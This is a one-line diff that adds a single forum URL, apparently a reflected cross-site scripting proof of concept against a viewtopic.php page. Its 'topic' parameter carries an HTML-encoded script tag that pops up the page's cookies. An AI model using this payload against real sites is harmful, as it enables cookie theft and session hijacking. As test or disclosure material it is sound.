@@ -1,0 +1,1 @@
+http://www.example.com/viewtopic.php?topic=3&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;forum=1
